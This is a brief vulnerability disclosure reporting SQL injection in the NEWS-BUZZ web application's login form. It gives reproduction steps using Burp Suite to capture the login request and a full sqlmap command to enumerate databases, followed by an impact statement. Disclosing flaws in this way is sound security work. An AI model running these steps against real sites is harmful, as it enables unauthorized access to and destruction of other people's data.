# Summary:
SQL injection is an attack technique that exploits a security vulnerability occurring in the database layer of an application.

# Description:
SQL injection is a vulnerability that allows an attacker to alter backend SQL statements by manipulating the user input.

# POC

Steps To Reproduce:


1. Go to : http://localhost/NEWS-BUZZ-master/


![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/db8135f1-ec33-4525-9d33-13fbac76e537)


2.  Input `Username : username` and `Password: 123`, then use `Burp Suite` and press button `Submit` to Intercept request.


![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/3797f472-5619-4a1f-b0e7-cd234ec52297)



![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/eb06a3d8-7b73-4bfd-8fc1-02a28517221a)


3. Save request with file name extension is `.txt`


![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/fe8c365a-fc98-4b94-8804-d17523b431d8)


 4. Use `sqlmap` with payload : 
  `python3 sqlmap.py -r test.txt --risk 2 --dbms=MySQL --dbs --batch`

![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/d5cabc60-0e05-45c9-9704-0068a2a1a53c)


![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/99e0204d-9eb9-4514-8086-6cdc8354288a)


# Impact:

A successful attack may result in the unauthorized viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights to a database.

